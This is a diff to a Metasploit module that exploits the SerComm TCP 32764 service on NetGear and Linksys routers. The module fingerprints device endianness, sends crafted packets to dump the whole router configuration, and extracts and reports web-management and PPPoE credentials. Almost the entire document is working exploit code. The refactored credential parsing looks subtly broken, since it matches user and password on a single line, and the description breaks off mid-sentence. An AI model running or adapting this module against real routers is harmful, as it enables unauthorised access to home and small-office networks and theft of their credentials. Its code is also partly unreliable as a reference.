@@ -1,3 +1,8 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
 require 'msf/core'
 require 'msf/core/auxiliary/report'
 
@@ -6,32 +11,7 @@ class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "SerComm Device Configuration Dump",
-      'Description'    => %q{
-          This module will dump the configuration of several SerComm devices. These devices
-          typically include routers from NetGear and Linksys.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>',   #Initial discovery, poc
-          'Matt "hostess" Andreko <mandreko[at]accuvant.com>',  #Msf module
-        ],
-      'References'     =>
-        [
-          [ 'URL', 'https://github.com/elvanderb/TCP-32764' ],
-        ],
-      'DisclosureDate' => "Dec 31 2013" ))
-
-      register_options(
-        [
-          Opt::RPORT(32764),
-        ], self.class)
-  end
-
-  Settings = {
+  SETTINGS = {
     'Creds' => [
       [ 'HTTP Web Management', { 'user' => /http_username=(\S+)/i, 'pass' => /http_password=(\S+)/i } ],
       [ 'PPPoE', { 'user' => /pppoe_username=(\S+)/i, 'pass' => /pppoe_password=(\S+)/i } ],
@@ -46,32 +26,154 @@ class Metasploit3 < Msf::Auxiliary
     ]
   }
 
+  attr_accessor :endianess
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "SerComm Device Configuration Dump",
+      'Description'    => %q{
+        This module will dump the configuration of several SerComm devices. These devices
+        typically include routers from NetGear and Linksys. This module has been tested
+        successfully on
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>', #Initial discovery, poc
+          'Matt "hostess" Andreko <mandreko[at]accuvant.com>' #Msf module
+        ],
+      'References'     =>
+        [
+          [ 'OSVDB', '101653' ],
+          [ 'URL', 'https://github.com/elvanderb/TCP-32764' ]
+        ],
+      'DisclosureDate' => "Dec 31 2013" ))
+
+      register_options(
+        [
+          Opt::RPORT(32764),
+        ], self.class)
+  end
+
   def run
+    print_status("#{peer} - Attempting to connect and check endianess...")
+    @endianess = fingerprint_endian
 
-    print_status("Attempting to connect to #{rhost} to dump configuration.")
+    if endianess.nil?
+      print_error("Failed to check endianess, aborting...")
+      return
+    end
+    print_good("#{peer} - #{string_endianess} device found...")
 
-    connect
+    print_status("#{peer} - Attempting to connect and dump configuration...")
+    config = dump_configuration
 
-    data = [0x53634d4d, 0x01, 0x00].pack("VVV")
-    sock.put(data)
-    junk = sock.get_once # The MMcS text shows up again for some reason
-    response = sock.get(3, 3)
-
-    disconnect
-
-    if response.nil? or response.empty?
-      print_status("No response from server")
+    if config.nil?
+      print_status("#{peer} - Error retrieving configuration, aborting...")
       return
     end
 
-    vprint_status("Response: #{response}")
+    loot_file = store_loot("router.config", "text/plain", rhost, config[:data], "#{rhost}router_config.txt", "Router Configurations")
+    print_status("#{peer} - Router configuration dump stored in: #{loot_file}")
 
-    loot_file = store_loot("router.config", "text/plain", rhost, response, "#{rhost}router_config.txt", "Router Configurations")
-    print_status("Router configuration dump stored in: #{loot_file}")
+    parse_configuration(config[:data])
+  end
 
-    configs = response.split(?\x00)
+  private
 
-    if (datastore['VERBOSE'])
+  def little_endian?
+    return endianess == 'LE'
+  end
+
+  def big_endian?
+    return endianess == 'BE'
+  end
+
+  def string_endianess
+    if little_endian?
+      return "Little Endian"
+    elsif big_endian?
+      return "Big Endian"
+    end
+
+    return nil
+  end
+
+  def peer
+    return "#{rhost}:#{rport}"
+  end
+
+  def fingerprint_endian
+    begin
+      connect
+      sock.put(Rex::Text.rand_text(5))
+      res = sock.get_once
+      disconnect
+    rescue Rex::ConnectionError => e
+      print_error("Connection failed: #{e.class}: #{e}")
+      return nil
+    end
+
+    unless res
+      return nil
+    end
+
+    if res.start_with?("MMcS")
+      return 'BE'
+    elsif res.start_with?("ScMM")
+      return 'LE'
+    end
+
+    return nil
+  end
+
+  def dump_configuration
+    if big_endian?
+      pkt = [0x4d4d6353, 0x01, 0x01].pack("NVV")
+    elsif little_endian?
+      pkt = [0x4d4d6353, 0x01, 0x01].pack("VNN")
+    else
+      return nil
+    end
+
+    connect
+    sock.put(pkt)
+    res = sock.get_once
+    disconnect
+
+    if res.blank?
+      vprint_error("#{peer} - No answer...")
+      return
+    end
+
+    if big_endian?
+      mark, zero, length, data = res.unpack("NVVa*")
+    else
+      mark, zero, length, data = res.unpack("VNNa*")
+    end
+
+    unless mark == 0x4d4d6353
+      vprint_error("#{peer} - Incorrect mark when reading response")
+      return nil
+    end
+
+    unless zero == 0
+      vprint_error("#{peer} - Incorrect zero when reading response")
+      return nil
+    end
+
+    unless length == data.length
+      vprint_warning("#{peer} - Inconsistent length / data packet")
+      #return nil
+    end
+
+    return { :length => length, :data => data }
+  end
+
+  def parse_configuration(data)
+    configs = data.split(?\x00)
+
+    if datastore['VERBOSE']
       vprint_status('All configuration values:')
       configs.sort.each do |i|
         if i.strip.match(/.*=\S+/)
@@ -80,44 +182,49 @@ class Metasploit3 < Msf::Auxiliary
       end
     end
 
-    Settings['General'].each do |regex|
-      configs.each do |config|
-        if config.match(regex[1])
-          value = $1
-          print_status("#{regex[0]}: #{value}")
-        end
+    configs.each do |config|
+      parse_general_config(config)
+      parse_auth_config(config)
+    end
+  end
+
+  def parse_general_config(config)
+    SETTINGS['General'].each do |regex|
+      if config.match(regex[1])
+        value = $1
+        print_status("#{regex[0]}: #{value}")
       end
     end
+  end
 
-    Settings['Creds'].each do |cred|
+  def parse_auth_config(config)
+    SETTINGS['Creds'].each do |cred|
       user = nil
       pass = nil
 
       # find the user/pass
-      configs.each do |config|
-        if config.match(cred[1]['user'])
-          user = $1
-        end
-        if config.match(cred[1]['pass'])
-          pass = $1
-        end
+      if config.match(cred[1]['user'])
+        user = $1
+      end
+      if config.match(cred[1]['pass'])
+        pass = $1
       end
 
       # if user and pass are specified, report on them
       if user and pass
-        print_status("#{cred[0]}: User: #{user} Pass: #{pass}")
+        print_status("#{peer} - #{cred[0]}: User: #{user} Pass: #{pass}")
         auth = {
-          :host => rhost,
-          :port => rport,
-          :user => user,
-          :pass => pass,
-          :type => 'password',
-          :source_type => "exploit",
-          :active => true
+            :host => rhost,
+            :port => rport,
+            :user => user,
+            :pass => pass,
+            :type => 'password',
+            :source_type => "exploit",
+            :active => true
         }
         report_auth_info(auth)
       end
     end
-
   end
+
 end
